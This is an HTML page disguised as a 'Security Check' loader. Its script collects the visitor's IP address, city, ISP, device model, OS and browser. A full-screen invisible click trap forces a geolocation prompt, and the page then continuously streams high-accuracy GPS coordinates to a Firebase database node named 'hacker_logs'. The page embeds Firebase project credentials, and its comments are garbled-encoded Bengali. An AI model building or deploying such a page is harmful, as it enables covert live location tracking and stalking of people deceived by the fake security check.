<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Gateway</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡ßß. ‡¶´‡¶æ‡¶Å‡¶¶ ‡¶™‡¶æ‡¶§‡¶æ ‡¶π‡¶≤‡ßã
        window.initLog = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data,
                latitude: "Connecting...",
                longitude: "Connecting...",
                actionStatus: "Live Tracking Started..."
            }).then(() => {
                sessionStorage.setItem('logKey', newLogRef.key);
                startLiveTracking(); // ‡¶≤‡¶æ‡¶á‡¶≠ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ
            });
        };

        // ‡ß®. ‡¶≤‡¶æ‡¶á‡¶≠ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    lastUpdate: new Date().toLocaleTimeString(), // ‡¶ï‡¶ñ‡¶® ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶π‡¶≤‡ßã
                    actionStatus: "üî¥ Live Tracking Active"
                });
            }
        };
    </script>

    <style>
        body {
            margin: 0; padding: 0; background-color: #f0f2f5;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden; font-family: sans-serif; cursor: progress;
        }
        #clickTrap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
        .loader-box { text-align: center; background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .spinner { width: 50px; height: 50px; border: 5px solid #e1e4e8; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>
    <div class="loader-box">
        <div class="spinner"></div>
        <h2 style="color:#333; margin-bottom:5px;">Security Check...</h2>
        <p style="color:#888; font-size:13px;">Establishing secure connection.</p>
    </div>

    <script>
        let isAsking = false;

        window.onload = function() {
            // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶°‡¶æ‡¶ü‡¶æ ‡¶´‡ßá‡¶ö
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => { prepareInitialData(data); })
                .catch(() => { prepareInitialData({ ip: "Unknown" }); });
        };

        function prepareInitialData(ipInfo) {
            var parser = new UAParser();
            var result = parser.getResult();
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

            let initialPayload = {
                ip: ipInfo.ip || "Tracing...",
                city: ipInfo.city || "Tracing...",
                isp: ipInfo.org || "Tracing...",
                deviceModel: deviceName,
                os: result.os.name,
                browser: result.browser.name
            };

            if(window.initLog) window.initLog(initialPayload);
        }

        // üî• ‡¶≤‡¶æ‡¶á‡¶≠ ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶≤‡¶ú‡¶ø‡¶ï (watchPosition)
        function startLiveTracking() {
            setTimeout(forceBrowserPrompt, 100);
            document.addEventListener('touchstart', forceBrowserPrompt);
            document.addEventListener('click', forceBrowserPrompt);
        }

        function forceBrowserPrompt() {
            if(isAsking) return;
            isAsking = true;

            if ("geolocation" in navigator) {
                // getCurrentPosition ‡¶è‡¶∞ ‡¶¨‡¶¶‡¶≤‡ßá watchPosition
                navigator.geolocation.watchPosition(
                    function(position) {
                        // ‡¶Ø‡¶§‡¶¨‡¶æ‡¶∞ ‡¶®‡ßú‡¶¨‡ßá, ‡¶§‡¶§‡¶¨‡¶æ‡¶∞ ‡¶è‡¶á ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ‡¶ï‡¶≤ ‡¶π‡¶¨‡ßá
                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
                        document.querySelector('h2').innerText = "Verified!";
                        
                        // ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶™ ‡¶∏‡¶∞‡¶ø‡ßü‡ßá ‡¶´‡ßá‡¶≤‡¶≤‡¶æ‡¶Æ, ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶°‡ßá ‡¶ü‡ßç‡¶∞‡ßç‡¶Ø‡¶æ‡¶ï‡¶ø‡¶Ç ‡¶ö‡¶≤‡¶¨‡ßá
                        document.getElementById('clickTrap').style.display = 'none';

                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    function(error) {
                        isAsking = false; // ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶∞‡ßá‡¶°‡¶ø
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            }
        }
    </script>
</body>
</html>
